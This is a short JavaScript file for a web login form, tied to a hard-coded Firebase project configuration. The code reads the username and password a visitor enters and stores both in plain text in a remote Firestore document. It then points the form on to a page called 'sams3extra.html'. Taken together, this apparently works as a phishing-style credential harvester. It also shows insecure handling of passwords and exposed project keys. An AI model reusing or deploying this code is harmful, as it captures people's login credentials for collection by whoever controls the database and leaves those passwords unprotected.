var firebaseConfig = {
    apiKey: "AIzaSyA4giFpp3wI4O3dU392Wz8bytkS7A3RotY",
    authDomain: "astute-compiler-247613.firebaseapp.com",
    databaseURL: "https://astute-compiler-247613.firebaseio.com",
    projectId: "astute-compiler-247613",
    storageBucket: "",
    messagingSenderId: "283521296502",
    appId: "1:283521296502:web:80f240f1cda85dee"
  };
  
  firebase.initializeApp(firebaseConfig);
  var db = firebase.firestore();
  
  $("#form1").submit(function(e) {
    e.preventDefault();
    var users= document.getElementById("user").value;
    var passz= document.getElementById("pass").value;
    saveItemToDatabase(users,passz);
    
});

    function saveItemToDatabase(users, passz){
      doc= db.collection("users").doc("originalUser").set({
        user: users,
        pass: passz
      })
    .then(function() {
      db.collection("users").doc("originalUser").get().then(function(doc) {
        clear();
      });
    });
  };


    function clear() {
    document.getElementById("user").value= "";
    document.getElementById("pass").value= "";
    }
    
    
    function loadUser(){
      db.collection("users").doc("currentUser").get().then(function(doc){
        clear();
        document.getElementById('form1').action; 
        document.getElementById('form1').action = "sams3extra.html"
      });
    };
    
    $(document).ready(function(){
      loadUser()
    });
  
  
  